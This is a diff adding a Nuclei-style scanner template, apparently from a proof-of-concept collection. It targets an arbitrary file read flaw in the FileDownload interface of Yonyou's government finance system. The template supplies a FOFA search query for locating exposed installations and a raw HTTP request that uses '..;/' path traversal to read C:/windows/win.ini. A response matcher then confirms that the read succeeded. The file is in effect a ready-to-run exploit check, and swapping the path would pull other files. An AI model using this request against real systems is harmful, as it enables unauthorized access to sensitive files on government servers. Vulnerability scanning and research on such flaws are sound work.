@@ -1,0 +1,29 @@
+id: yonyou-gov-a-filedownload-lfi
+
+info:
+  name: "用友政务A++ FileDownload 接口任意文件读取漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: app="用友-政务财务系统" || body="/df/portal/getYearRgcode.do"
+        用友政务A++ 系统的 FileDownload 接口存在文件读取漏洞，攻击者可通过构造特定请求读取任意文件，可能导致敏感信息泄露及系统安全风险
+  tags: 用友政务A++
+
+http:
+- raw:
+  - |
+    GET /pub/fe/config/..;/..;/..;/bg/attach/FileDownload?execlPath=C:/windows/win.ini HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Accept-Encoding: gzip, deflate, br
+    Accept-Language: en-US;q=0.9,en;q=0.8
+    Cache-Control: max-age=0
+    Connection: close
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - "for 16-bit app support"
